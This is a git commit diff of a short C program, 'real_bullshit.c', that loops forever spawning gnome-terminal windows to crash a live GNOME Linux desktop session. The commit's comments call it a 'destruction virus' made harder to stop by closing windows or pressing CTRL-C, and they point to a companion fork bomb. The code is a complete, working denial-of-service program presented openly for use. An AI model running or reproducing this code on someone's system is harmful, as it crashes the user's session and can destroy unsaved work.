1c7ce1b1b3d5516750ff5d4a8deb561a6f5a0679
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2022-08-24 04:08:25 -0400

    Update real_bullshit.c

--- real_bullshit.c
+++ real_bullshit.c
@@ -1,10 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 // filename: real_bullshit.c
-// file description: (less) basic destruction virus based on BULLSHIT
-// destroys a live session by spam-spawning terminal windows
-// disarm instructions: simply close terminal window
-// actually, you can't disarm this real bullshit like that. It don't work!
+// file description: more reliable version of BULLSH1T
+// destroys a live gnome Linux session by spam-spawning terminal windows
+// That way, the Linux Desktop user can't interrupt by closing terminal window, or by using key escape sequence such as CTRL-C.
+// tested only on Linux Mint so far, but this should work on anything where gnome-terminal is enabled.
 
 int main(){
 
@@ -12,6 +12,7 @@ int main(){
 
 	while(420>69){
 		system("gnome-terminal pwd");
-		// spawns infinite terminal windows
+		// spawns infinite terminal windows until your system crashes
+		// for a more silent "what hit me?" crash, check out fork_bomb.c
 	}
 }
